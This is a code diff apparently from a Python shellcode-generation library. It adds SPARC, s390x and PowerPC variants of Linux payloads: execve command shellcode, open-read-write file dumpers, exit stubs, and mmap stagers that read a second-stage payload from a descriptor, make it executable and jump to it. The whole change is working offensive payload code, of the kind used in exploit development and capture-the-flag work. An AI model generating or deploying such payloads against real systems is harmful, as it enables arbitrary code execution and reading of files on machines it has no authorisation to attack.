@@ -1,4 +1,4 @@
-"""Position-independent Linux shellcode payloads for the primary target matrix."""
+"""Position-independent Linux shellcode payloads for the implemented target matrix."""
 
 from __future__ import annotations
 
@@ -7,7 +7,7 @@ from dataclasses import dataclass
 from .assembler import LLVMAssembler
 from .errors import UnsupportedTargetError
 from .model import MemoryRequirement, Payload, PayloadKind, Permission
-from .target import Architecture, Target
+from .target import ABI, Architecture, Target
 
 _MAX_STACK_IMAGE = 1792
 
@@ -19,9 +19,13 @@ def _align(value: int, alignment: int) -> int:
 def _instruction_alignment(target: Target) -> int:
     if target.arch in {Architecture.X86, Architecture.X86_64}:
         return 1
-    if target.arch is Architecture.THUMB:
+    if target.arch in {Architecture.THUMB, Architecture.S390X}:
         return 2
     return 4
+
+
+def _requires_instruction_cache_sync(target: Target) -> bool:
+    return target.arch not in {Architecture.X86, Architecture.X86_64, Architecture.S390X}
 
 
 @dataclass(frozen=True, slots=True)
@@ -108,6 +112,9 @@ def _header(target: Target) -> list[str]:
         lines.extend((".set noreorder", ".set nomips16"))
     elif target.arch in {Architecture.RISCV32, Architecture.RISCV64}:
         lines.append(".option norvc")
+    elif target.arch is Architecture.POWERPC64:
+        version = 1 if target.abi is ABI.POWERPC64_ELFV1 else 2
+        lines.append(f".abiversion {version}")
     lines.append(".globl _start")
     if target.arch is Architecture.THUMB:
         lines.append(".thumb_func")
@@ -277,6 +284,129 @@ def _riscv_execve(target: Target, stack: _ExecveStack) -> list[str]:
             "li a0, 127",
             "li a7, 93",
             "ecall",
+        )
+    )
+    return lines
+
+
+def _sparc_stack_bias(target: Target) -> int:
+    return 2047 if target.arch is Architecture.SPARC64 else 0
+
+
+def _sparc_trap(target: Target) -> str:
+    return "0x6d" if target.arch is Architecture.SPARC64 else "0x10"
+
+
+def _sparc_load_word(target: Target, register: str, value: int) -> list[str]:
+    if target.arch is Architecture.SPARC64:
+        return [f"setx 0x{value & target.mask:x}, %l7, {register}"]
+    return [f"set 0x{value & target.mask:x}, {register}"]
+
+
+def _sparc_execve(target: Target, stack: _ExecveStack) -> list[str]:
+    bias = _sparc_stack_bias(target)
+    trap = _sparc_trap(target)
+    store = "stx" if target.arch is Architecture.SPARC64 else "st"
+    lines = [f"sub %sp, {stack.frame_size}, %sp"]
+    for offset, value in _word_chunks(target, stack.data):
+        lines.extend(_sparc_load_word(target, "%l0", value))
+        lines.append(f"{store} %l0, [%sp + {bias + offset}]")
+    for index, offset in enumerate((stack.path_offset, stack.dash_c_offset, stack.command_offset)):
+        lines.extend(
+            (
+                f"add %sp, {bias + offset}, %l0",
+                f"{store} %l0, [%sp + {bias + stack.argv_offset + index * target.word_size}]",
+            )
+        )
+    lines.extend(
+        (
+            f"add %sp, {bias + stack.path_offset}, %o0",
+            f"add %sp, {bias + stack.argv_offset}, %o1",
+            "clr %o2",
+            "mov 59, %g1",
+            f"ta {trap}",
+            "mov 127, %o0",
+            "mov 1, %g1",
+            f"ta {trap}",
+        )
+    )
+    return lines
+
+
+def _s390_load_word(register: str, value: int) -> list[str]:
+    return [
+        f"llihf {register}, 0x{value >> 32 & 0xFFFFFFFF:x}",
+        f"oilf {register}, 0x{value & 0xFFFFFFFF:x}",
+    ]
+
+
+def _s390_execve(target: Target, stack: _ExecveStack) -> list[str]:
+    lines = [f"lay %r15, -{stack.frame_size}(%r15)"]
+    for offset, value in _word_chunks(target, stack.data):
+        lines.extend(_s390_load_word("%r0", value))
+        lines.append(f"stg %r0, {offset}(%r15)")
+    for index, offset in enumerate((stack.path_offset, stack.dash_c_offset, stack.command_offset)):
+        lines.extend(
+            (
+                f"la %r0, {offset}(%r15)",
+                f"stg %r0, {stack.argv_offset + index * 8}(%r15)",
+            )
+        )
+    lines.extend(
+        (
+            f"la %r2, {stack.path_offset}(%r15)",
+            f"la %r3, {stack.argv_offset}(%r15)",
+            "lghi %r4, 0",
+            "lghi %r1, 11",
+            "svc 0",
+            "lghi %r2, 127",
+            "lghi %r1, 1",
+            "svc 0",
+        )
+    )
+    return lines
+
+
+def _powerpc_load_word(target: Target, register: int, value: int) -> list[str]:
+    value &= target.mask
+    signed = value if value < 1 << (target.bits - 1) else value - (1 << target.bits)
+    if -0x8000 <= signed <= 0x7FFF:
+        return [f"li {register}, {signed}"]
+
+    parts = [(value >> shift) & 0xFFFF for shift in range(target.bits - 16, -1, -16)]
+    first = next(index for index, part in enumerate(parts) if part)
+    lines = [f"li {register}, 0", f"ori {register}, {register}, {parts[first]}"]
+    shift = "sldi" if target.arch is Architecture.POWERPC64 else "slwi"
+    for part in parts[first + 1 :]:
+        lines.append(f"{shift} {register}, {register}, 16")
+        if part:
+            lines.append(f"ori {register}, {register}, {part}")
+    return lines
+
+
+def _powerpc_execve(target: Target, stack: _ExecveStack) -> list[str]:
+    store = "std" if target.arch is Architecture.POWERPC64 else "stw"
+    lines = [f"addi 1, 1, -{stack.frame_size}"]
+    for offset, value in _word_chunks(target, stack.data):
+        lines.extend(_powerpc_load_word(target, 9, value))
+        lines.append(f"{store} 9, {offset}(1)")
+    for index, offset in enumerate((stack.path_offset, stack.dash_c_offset, stack.command_offset)):
+        lines.extend(
+            (
+                f"addi 9, 1, {offset}",
+                f"{store} 9, {stack.argv_offset + index * target.word_size}(1)",
+            )
+        )
+    lines.extend(
+        (
+            f"addi 3, 1, {stack.path_offset}",
+            f"addi 4, 1, {stack.argv_offset}",
+            "li 5, 0",
+            "li 0, 11",
+            "sc",
+            "li 3, 127",
+            "li 0, 1",
+            "sc",
         )
     )
     return lines
@@ -536,6 +666,143 @@ def _riscv_orw(target: Target, stack: _OrwStack, output_fd: int) -> list[str]:
     return lines
 
 
+def _sparc_orw(target: Target, stack: _OrwStack, output_fd: int) -> list[str]:
+    bias = _sparc_stack_bias(target)
+    trap = _sparc_trap(target)
+    store = "stx" if target.arch is Architecture.SPARC64 else "st"
+    lines = [f"sub %sp, {stack.frame_size}, %sp"]
+    for offset, value in _word_chunks(target, stack.data):
+        lines.extend(_sparc_load_word(target, "%l0", value))
+        lines.append(f"{store} %l0, [%sp + {bias + offset}]")
+    lines.extend(
+        (
+            f"add %sp, {bias + stack.path_offset}, %o0",
+            "clr %o1",
+            "clr %o2",
+            "mov 5, %g1",
+            f"ta {trap}",
+            "bcs .Lorw_fail",
+            "nop",
+            "mov %o0, %l2",
+            "mov %l2, %o0",
+            f"add %sp, {bias + stack.buffer_offset}, %o1",
+            f"set {stack.buffer_size}, %o2",
+            "mov 3, %g1",
+            f"ta {trap}",
+            "bcs .Lorw_done",
+            "nop",
+            "cmp %o0, 0",
+            "ble .Lorw_done",
+            "nop",
+            "mov %o0, %o2",
+            f"set {output_fd}, %o0",
+            f"add %sp, {bias + stack.buffer_offset}, %o1",
+            "mov 4, %g1",
+            f"ta {trap}",
+            ".Lorw_done:",
+            "clr %o0",
+            "mov 1, %g1",
+            f"ta {trap}",
+            ".Lorw_fail:",
+            "mov 126, %o0",
+            "mov 1, %g1",
+            f"ta {trap}",
+        )
+    )
+    return lines
+
+
+def _s390_orw(target: Target, stack: _OrwStack, output_fd: int) -> list[str]:
+    lines = [f"lay %r15, -{stack.frame_size}(%r15)"]
+    for offset, value in _word_chunks(target, stack.data):
+        lines.extend(_s390_load_word("%r0", value))
+        lines.append(f"stg %r0, {offset}(%r15)")
+    lines.extend(
+        (
+            f"la %r2, {stack.path_offset}(%r15)",
+            "lghi %r3, 0",
+            "lghi %r4, 0",
+            "lghi %r1, 5",
+            "svc 0",
+            "ltgr %r2, %r2",
+            "jl .Lorw_fail",
+            "lgr %r8, %r2",
+            "lgr %r2, %r8",
+            f"la %r3, {stack.buffer_offset}(%r15)",
+            f"llilf %r4, {stack.buffer_size}",
+            "lghi %r1, 3",
+            "svc 0",
+            "ltgr %r2, %r2",
+            "jle .Lorw_done",
+            "lgr %r4, %r2",
+            f"llilf %r2, {output_fd}",
+            f"la %r3, {stack.buffer_offset}(%r15)",
+            "lghi %r1, 4",
+            "svc 0",
+            ".Lorw_done:",
+            "lghi %r2, 0",
+            "lghi %r1, 1",
+            "svc 0",
+            ".Lorw_fail:",
+            "lghi %r2, 126",
+            "lghi %r1, 1",
+            "svc 0",
+        )
+    )
+    return lines
+
+
+def _powerpc_orw(target: Target, stack: _OrwStack, output_fd: int) -> list[str]:
+    store = "std" if target.arch is Architecture.POWERPC64 else "stw"
+    compare = "cmpdi" if target.arch is Architecture.POWERPC64 else "cmpwi"
+    lines = [f"addi 1, 1, -{stack.frame_size}"]
+    for offset, value in _word_chunks(target, stack.data):
+        lines.extend(_powerpc_load_word(target, 9, value))
+        lines.append(f"{store} 9, {offset}(1)")
+    lines.extend(
+        (
+            f"addi 3, 1, {stack.path_offset}",
+            "li 4, 0",
+            "li 5, 0",
+            "li 0, 5",
+            "sc",
+            "bso .Lorw_fail",
+            "mr 14, 3",
+            "mr 3, 14",
+            f"addi 4, 1, {stack.buffer_offset}",
+        )
+    )
+    lines.extend(_powerpc_load_word(target, 5, stack.buffer_size))
+    lines.extend(
+        (
+            "li 0, 3",
+            "sc",
+            "bso .Lorw_done",
+            f"{compare} 3, 0",
+            "ble .Lorw_done",
+            "mr 15, 3",
+        )
+    )
+    lines.extend(_powerpc_load_word(target, 3, output_fd))
+    lines.extend(
+        (
+            f"addi 4, 1, {stack.buffer_offset}",
+            "mr 5, 15",
+            "li 0, 4",
+            "sc",
+            ".Lorw_done:",
+            "li 3, 0",
+            "li 0, 1",
+            "sc",
+            ".Lorw_fail:",
+            "li 3, 126",
+            "li 0, 1",
+            "sc",
+        )
+    )
+    return lines
+
+
 def exit_source(status: int, target: Target) -> str:
     """Lower a Linux ``exit(status)`` shellcode stub."""
 
@@ -558,6 +825,13 @@ def exit_source(status: int, target: Target) -> str:
         lines.extend((f"{add} $a0, $zero, {status}", f"{load} $v0, {number}", "syscall", "nop"))
     elif target.arch in {Architecture.RISCV32, Architecture.RISCV64}:
         lines.extend((f"li a0, {status}", "li a7, 93", "ecall"))
+    elif target.arch in {Architecture.SPARC32, Architecture.SPARC64}:
+        lines.extend((f"mov {status}, %o0", "mov 1, %g1", f"ta {_sparc_trap(target)}"))
+    elif target.arch is Architecture.S390X:
+        lines.extend((f"lghi %r2, {status}", "lghi %r1, 1", "svc 0"))
+    elif target.arch in {Architecture.POWERPC32, Architecture.POWERPC64}:
+        lines.extend(_powerpc_load_word(target, 3, status))
+        lines.extend(("li 0, 1", "sc"))
     else:
         raise UnsupportedTargetError(f"exit shellcode is not implemented for {target.name}")
     return "\n".join(lines) + "\n"
@@ -586,8 +860,7 @@ def exit_shellcode(status: int, target: Target, *, assembler: LLVMAssembler | No
             "operation": "exit",
             "status": status,
             "position_independent": True,
-            "requires_instruction_cache_sync_after_runtime_write": target.arch
-            not in {Architecture.X86, Architecture.X86_64},
+            "requires_instruction_cache_sync_after_runtime_write": _requires_instruction_cache_sync(target),
             "assembly": source,
         },
     )
@@ -904,6 +1177,213 @@ def _riscv_stager(target: Target, size: int, map_size: int, input_fd: int) -> li
     ]
 
 
+def _sparc_stager(target: Target, size: int, map_size: int, input_fd: int) -> list[str]:
+    trap = _sparc_trap(target)
+    flush_count = _align(size, 8) // 8
+    lines = [
+        "clr %o0",
+    ]
+    lines.extend(_sparc_load_word(target, "%o1", map_size))
+    lines.extend(
+        (
+            "mov 3, %o2",
+            "mov 0x22, %o3",
+            "mov -1, %o4",
+            "clr %o5",
+            "mov 71, %g1",
+            f"ta {trap}",
+            "bcs .Lstage_fail",
+            "nop",
+            "mov %o0, %l0",
+            "mov %o0, %l1",
+        )
+    )
+    lines.extend(_sparc_load_word(target, "%l2", size))
+    lines.extend((".Lstage_read:",))
+    lines.extend(_sparc_load_word(target, "%o0", input_fd))
+    lines.extend(
+        (
+            "mov %l1, %o1",
+            "mov %l2, %o2",
+            "mov 3, %g1",
+            f"ta {trap}",
+            "bcs .Lstage_fail",
+            "nop",
+            "cmp %o0, 0",
+            "ble .Lstage_fail",
+            "nop",
+            "add %l1, %o0, %l1",
+            "sub %l2, %o0, %l2",
+            "cmp %l2, 0",
+            "bne .Lstage_read",
+            "nop",
+            "mov %l0, %o0",
+        )
+    )
+    lines.extend(_sparc_load_word(target, "%o1", map_size))
+    lines.extend(
+        (
+            "mov 5, %o2",
+            "mov 74, %g1",
+            f"ta {trap}",
+            "bcs .Lstage_fail",
+            "nop",
+            "mov %l0, %l1",
+        )
+    )
+    lines.extend(_sparc_load_word(target, "%l2", flush_count))
+    lines.extend(
+        (
+            ".Lstage_flush:",
+            "flush %l1",
+            "add %l1, 8, %l1",
+            "subcc %l2, 1, %l2",
+            "bne .Lstage_flush",
+            "nop",
+            "membar #Sync" if target.arch is Architecture.SPARC64 else "stbar",
+            "jmp %l0",
+            "nop",
+            ".Lstage_fail:",
+            "mov 125, %o0",
+            "mov 1, %g1",
+            f"ta {trap}",
+        )
+    )
+    return lines
+
+
+def _s390_stager(size: int, map_size: int, input_fd: int) -> list[str]:
+    # Linux s390x retains sys_old_mmap: r2 points at six unsigned-long
+    # arguments rather than carrying them directly in r2..r7.
+    lines = [
+        "lay %r15, -48(%r15)",
+        "lghi %r0, 0",
+        "stg %r0, 0(%r15)",
+    ]
+    lines.extend(_s390_load_word("%r0", map_size))
+    lines.extend(
+        (
+            "stg %r0, 8(%r15)",
+            "lghi %r0, 3",
+            "stg %r0, 16(%r15)",
+            "lghi %r0, 0x22",
+            "stg %r0, 24(%r15)",
+            "lghi %r0, -1",
+            "stg %r0, 32(%r15)",
+            "lghi %r0, 0",
+            "stg %r0, 40(%r15)",
+            "la %r2, 0(%r15)",
+            "lghi %r1, 90",
+            "svc 0",
+            "ltgr %r2, %r2",
+            "jl .Lstage_fail",
+            "lgr %r8, %r2",
+            "lgr %r9, %r2",
+            f"llilf %r10, {size}",
+            ".Lstage_read:",
+            f"llilf %r2, {input_fd}",
+            "lgr %r3, %r9",
+            "lgr %r4, %r10",
+            "lghi %r1, 3",
+            "svc 0",
+            "ltgr %r2, %r2",
+            "jle .Lstage_fail",
+            "agr %r9, %r2",
+            "sgr %r10, %r2",
+            "ltgr %r10, %r10",
+            "jne .Lstage_read",
+            "lgr %r2, %r8",
+        )
+    )
+    lines.extend(_s390_load_word("%r3", map_size))
+    lines.extend(
+        (
+            "lghi %r4, 5",
+            "lghi %r1, 125",
+            "svc 0",
+            "ltgr %r2, %r2",
+            "jl .Lstage_fail",
+            "bcr 15, 0",
+            "br %r8",
+            ".Lstage_fail:",
+            "lghi %r2, 125",
+            "lghi %r1, 1",
+            "svc 0",
+        )
+    )
+    return lines
+
+
+def _powerpc_stager(target: Target, size: int, map_size: int, input_fd: int) -> list[str]:
+    compare = "cmpdi" if target.arch is Architecture.POWERPC64 else "cmpwi"
+    lines: list[str] = []
+    for register, value in ((3, 0), (4, map_size), (5, 3), (6, 0x22), (7, -1), (8, 0), (0, 90)):
+        lines.extend(_powerpc_load_word(target, register, value))
+    lines.extend(
+        (
+            "sc",
+            "bso .Lstage_fail",
+            "mr 14, 3",
+            "mr 15, 3",
+        )
+    )
+    lines.extend(_powerpc_load_word(target, 16, size))
+    lines.extend(_powerpc_load_word(target, 17, size))
+    lines.append(".Lstage_read:")
+    lines.extend(_powerpc_load_word(target, 3, input_fd))
+    lines.extend(
+        (
+            "mr 4, 15",
+            "mr 5, 16",
+            "li 0, 3",
+            "sc",
+            "bso .Lstage_fail",
+            f"{compare} 3, 0",
+            "ble .Lstage_fail",
+            "add 15, 15, 3",
+            "subf 16, 3, 16",
+            f"{compare} 16, 0",
+            "bne .Lstage_read",
+            "mr 3, 14",
+        )
+    )
+    lines.extend(_powerpc_load_word(target, 4, map_size))
+    lines.extend(
+        (
+            "li 5, 5",
+            "li 0, 125",
+            "sc",
+            "bso .Lstage_fail",
+            "mr 18, 14",
+            "mr 19, 17",
+            ".Lstage_dc:",
+            "dcbst 0, 18",
+            "addi 18, 18, 4",
+            "addi 19, 19, -4",
+            f"{compare} 19, 0",
+            "bgt .Lstage_dc",
+            "sync",
+            "mr 18, 14",
+            "mr 19, 17",
+            ".Lstage_ic:",
+            "icbi 0, 18",
+            "addi 18, 18, 4",
+            "addi 19, 19, -4",
+            f"{compare} 19, 0",
+            "bgt .Lstage_ic",
+            "sync",
+            "isync",
+            "mtctr 14",
+            "bctr",
+            ".Lstage_fail:",
+            "li 3, 125",
+            "li 0, 1",
+            "sc",
+        )
+    )
+    return lines
+
+
 def mmap_stager_source(
     size: int,
     target: Target,
@@ -926,6 +1406,8 @@ def mmap_stager_source(
     if page_size <= 0 or page_size & (page_size - 1):
         raise ValueError("page_size must be a positive power of two")
     map_size = _align(size, page_size)
+    if map_size > target.mask:
+        raise ValueError(f"mapping size does not fit {target.bits}-bit target")
     lines = _header(target)
     if target.arch in {Architecture.X86, Architecture.X86_64}:
         lines.extend(_x86_stager(target, size, map_size, input_fd))
@@ -937,6 +1419,12 @@ def mmap_stager_source(
         lines.extend(_mips_stager(target, size, map_size, input_fd))
     elif target.arch in {Architecture.RISCV32, Architecture.RISCV64}:
         lines.extend(_riscv_stager(target, size, map_size, input_fd))
+    elif target.arch in {Architecture.SPARC32, Architecture.SPARC64}:
+        lines.extend(_sparc_stager(target, size, map_size, input_fd))
+    elif target.arch is Architecture.S390X:
+        lines.extend(_s390_stager(size, map_size, input_fd))
+    elif target.arch in {Architecture.POWERPC32, Architecture.POWERPC64}:
+        lines.extend(_powerpc_stager(target, size, map_size, input_fd))
     else:
         raise UnsupportedTargetError(f"mmap stager is not implemented for {target.name}")
     return "\n".join(lines) + "\n", map_size
@@ -981,9 +1469,8 @@ def mmap_stager(
             "input_fd": input_fd,
             "mapping_transition": "rw-to-rx",
             "exact_read_loop": True,
-            "instruction_cache_finalized": target.arch not in {Architecture.X86, Architecture.X86_64},
-            "requires_instruction_cache_sync_after_runtime_write": target.arch
-            not in {Architecture.X86, Architecture.X86_64},
+            "instruction_cache_finalized": True,
+            "requires_instruction_cache_sync_after_runtime_write": _requires_instruction_cache_sync(target),
             "position_independent": True,
             "assembly": source,
         },
@@ -1005,6 +1492,12 @@ def command_source(command: str | bytes, target: Target) -> tuple[str, int]:
         lines.extend(_mips_execve(target, stack))
     elif target.arch in {Architecture.RISCV32, Architecture.RISCV64}:
         lines.extend(_riscv_execve(target, stack))
+    elif target.arch in {Architecture.SPARC32, Architecture.SPARC64}:
+        lines.extend(_sparc_execve(target, stack))
+    elif target.arch is Architecture.S390X:
+        lines.extend(_s390_execve(target, stack))
+    elif target.arch in {Architecture.POWERPC32, Architecture.POWERPC64}:
+        lines.extend(_powerpc_execve(target, stack))
     else:
         raise UnsupportedTargetError(f"command shellcode is not implemented for {target.name}")
     return "\n".join(lines) + "\n", stack.frame_size
@@ -1020,7 +1513,7 @@ def command_shellcode(
 
     source, stack_size = command_source(command, target)
     data = (assembler or LLVMAssembler()).assemble(source, target)
-    needs_cache_sync = target.arch not in {Architecture.X86, Architecture.X86_64}
+    needs_cache_sync = _requires_instruction_cache_sync(target)
     return Payload(
         data=data,
         target=target,
@@ -1074,6 +1567,12 @@ def orw_source(
         lines.extend(_mips_orw(target, stack, output_fd))
     elif target.arch in {Architecture.RISCV32, Architecture.RISCV64}:
         lines.extend(_riscv_orw(target, stack, output_fd))
+    elif target.arch in {Architecture.SPARC32, Architecture.SPARC64}:
+        lines.extend(_sparc_orw(target, stack, output_fd))
+    elif target.arch is Architecture.S390X:
+        lines.extend(_s390_orw(target, stack, output_fd))
+    elif target.arch in {Architecture.POWERPC32, Architecture.POWERPC64}:
+        lines.extend(_powerpc_orw(target, stack, output_fd))
     else:
         raise UnsupportedTargetError(f"ORW shellcode is not implemented for {target.name}")
     return "\n".join(lines) + "\n", stack.frame_size
@@ -1116,8 +1615,7 @@ def orw_shellcode(
             "max_bytes": max_bytes,
             "output_fd": output_fd,
             "position_independent": True,
-            "requires_instruction_cache_sync_after_runtime_write": target.arch
-            not in {Architecture.X86, Architecture.X86_64},
+            "requires_instruction_cache_sync_after_runtime_write": _requires_instruction_cache_sync(target),
             "assembly": source,
         },
     )
